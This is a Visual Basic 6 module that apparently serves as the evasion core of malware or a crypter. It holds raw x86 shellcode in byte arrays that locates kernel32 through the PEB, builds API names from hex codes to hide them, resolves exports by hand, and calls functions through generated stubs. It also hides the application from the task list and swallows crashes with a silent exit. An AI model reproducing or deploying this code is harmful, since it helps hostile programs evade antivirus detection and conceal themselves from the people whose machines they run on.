Attribute VB_Name = "mEngine"
Option Explicit

Public Const sKernelLib                     As String = "kernel32"
Public Const sExitProcess                   As String = "ExitProcess"
Public Const sSetUnhandledExceptionFilter   As String = "SetUnhandledExceptionFilter"

Public Declare Function CallWindowProcA Lib "user32" Alias "CallWindowProcW" (ByVal Address As Any, Optional ByVal Param1 As Long, Optional ByVal Param2 As Long, Optional ByVal Param3 As Long, Optional ByVal Param4 As Long) As Long

Private lKernel             As Long
Private lLoadLibraryW       As Long
Private bMoveMem(36)        As Byte
Private bLoadLibraryA(12)   As Byte
Private bGetKernel(19)      As Byte

Private Type EXCEPTION_RECORD
  ExceptionCode      As Long
  ExceptionFlags     As Long
  pExceptionRecord   As Long
  ExceptionAddress   As Long
  NumberParameters   As Long
  Information(14)    As Long
End Type

Private Type EXCEPTION_POINTERS
  pExceptionRecord   As EXCEPTION_RECORD
  ContextRecord      As Long
End Type

Public Function InitializeEngine() As Long
    Dim vTemp()         As Variant
    Dim i               As Long
    Dim sLoadLibraryW   As String
    
    vTemp() = Array(&HBE, &H0, &H0, &H0, &H0, &H8B, &H4C, &H24, &H4, &H51, &HFF, &HD6, &HC3)

    For i = 0 To 12
        bLoadLibraryA(i) = CByte(vTemp(i))
    Next i
    
    vTemp() = Array(&H4C, &H6F, &H61, &H64, &H4C, &H69, &H62, &H72, &H61, &H72, &H79, &H57)
    
    For i = 0 To 11
       sLoadLibraryW = sLoadLibraryW & Chr(vTemp(i))
    Next i

    vTemp() = Array(&H64, &HA1, &H30, &H0, &H0, &H0, &H8B, &H40, &HC, &H8B, &H40, &H14, &H8B, &H0, &H8B, &H0, &H8B, &H40, &H10, &HC3)
    
    For i = 0 To 19
       bGetKernel(i) = CByte(vTemp(i))
    Next i
    
    vTemp() = Array(&H55, &H8B, &HEC, &H56, &H57, &H60, &HFC, &H8B, &H75, &HC, &H8B, &H7D, &H8, &H8B, &H4D, &H10, &HC1, &HE9, &H2, &HF3, &HA5, &H8B, &H4D, &H10, &H83, &HE1, &H3, &HF3, &HA4, &H61, &H5F, &H5E, &HC9, &HC2, &H10, &H0, &H20)
    
    For i = 0 To 36
        bMoveMem(i) = CByte(vTemp(i))
    Next i
    
    lKernel = CallWindowProcA(VarPtr(bGetKernel(0)))
    lLoadLibraryW = GetProcAddress(lKernel, sLoadLibraryW)
    MoveMemory VarPtr(bLoadLibraryA(1)), VarPtr(lLoadLibraryW), 4
    
    'bUnhook = True
    
    Call CallFunction(sKernelLib, sSetUnhandledExceptionFilter, AddressOf ExceptionHandler)
    App.TaskVisible = False
    
End Function

Public Function LoadLibraryA(sLib As String) As Long
    LoadLibraryA = CallWindowProcA(VarPtr(bLoadLibraryA(0)), StrPtr(sLib))
End Function

Public Function CallFunction(ByVal sLib As String, ByVal sMod As String, ParamArray Params()) As Long
    Dim lPtr                As Long
    Dim bvASM(&HEC00& - 1)  As Byte
    Dim i                   As Long
    Dim lMod                As Long
    Dim lBase               As Long
    
    lBase = LoadLibraryA(sLib)
    lMod = GetProcAddress(lBase, sMod)
    
    'If bUnhook = True Then
    '    bUnhook = False
    '    UnhookProc lBase, lMod
    '    bUnhook = True
    'End If
    
    If lMod = 0 Then Exit Function
    lPtr = VarPtr(bvASM(0))
    MoveMemory lPtr, VarPtr(&H59595958), 4
    lPtr = lPtr + 4
    MoveMemory lPtr, VarPtr(&H5059), 4
    lPtr = lPtr + 2
    
    For i = UBound(Params) To 0 Step -1
        MoveMemory lPtr, VarPtr(&H68), 1
        lPtr = lPtr + 1
        MoveMemory lPtr, VarPtr(CLng(Params(i))), 4
        lPtr = lPtr + 4
    Next
    MoveMemory lPtr, VarPtr(&HE8), 1
    lPtr = lPtr + 1
    MoveMemory lPtr, VarPtr(lMod - lPtr - 4), 4
    lPtr = lPtr + 4
    MoveMemory lPtr, VarPtr(&HC3), 1
    lPtr = lPtr + 1
    
    CallFunction = CallWindowProcA(VarPtr(bvASM(0)))
End Function

Public Sub MoveMemory(ByVal lpDest As Long, ByVal lpSource As Long, ByVal cBytes As Long)
    CallWindowProcA VarPtr(bMoveMem(0)), lpDest, lpSource, cBytes
End Sub

Public Function GetProcAddress(ByVal lMod As Long, ByVal sProc As String) As Long
    Dim lFanew                  As Long
    Dim lVAddress               As Long
    Dim lVSize                  As Long
    Dim i                       As Long
    Dim lFunctAdd               As Long
    Dim lNameAdd                As Long
    Dim lNumbAdd                As Long
    Dim bvName()                As Byte
    Dim lNameBound              As Long
    Dim j                       As Long
    Dim bCurChar                As Byte
    Dim bFlag                   As Boolean
    Dim lNumberOfNames          As Long
    Dim lAddressOfNames         As Long
    Dim lAddressOfFunctions     As Long
    Dim lAddressOfNameOrdinals  As Long
    
    MoveMemory VarPtr(lFanew), lMod + 60, &H4
    MoveMemory VarPtr(lVAddress), lMod + lFanew + 120, &H4
    MoveMemory VarPtr(lVSize), lMod + lFanew + 124, &H4
    MoveMemory VarPtr(lNumberOfNames), lMod + lVAddress + 24, &H4
    MoveMemory VarPtr(lAddressOfFunctions), lMod + lVAddress + 28, &H4
    MoveMemory VarPtr(lAddressOfNames), lMod + lVAddress + 32, &H4
    MoveMemory VarPtr(lAddressOfNameOrdinals), lMod + lVAddress + 36, &H4
    
    bvName = StrConv(sProc, vbFromUnicode)
    lNameBound = UBound(bvName)
    
        For i = 0 To lNumberOfNames - 1
            MoveMemory VarPtr(lNameAdd), lMod + lAddressOfNames + i * 4, 4
            bFlag = False
            For j = 0 To lNameBound
                MoveMemory VarPtr(bCurChar), lMod + lNameAdd + j, 1
                If Not bCurChar = bvName(j) Then
                    bFlag = True
                    Exit For
                End If
            Next
         
            If Not bFlag Then
                MoveMemory VarPtr(lNumbAdd), lMod + lAddressOfNameOrdinals + i * 2, 2
                MoveMemory VarPtr(lFunctAdd), lMod + lAddressOfFunctions + lNumbAdd * 4, 4
                GetProcAddress = lFunctAdd + lMod
                Exit Function
            End If
        Next
End Function

Public Function ExceptionHandler(ByRef uException As EXCEPTION_POINTERS) As Long
    If uException.pExceptionRecord.ExceptionFlags = 1 Then
        CallFunction sKernelLib, sExitProcess, 0
    Else
        ExceptionHandler = -1
    End If
End Function

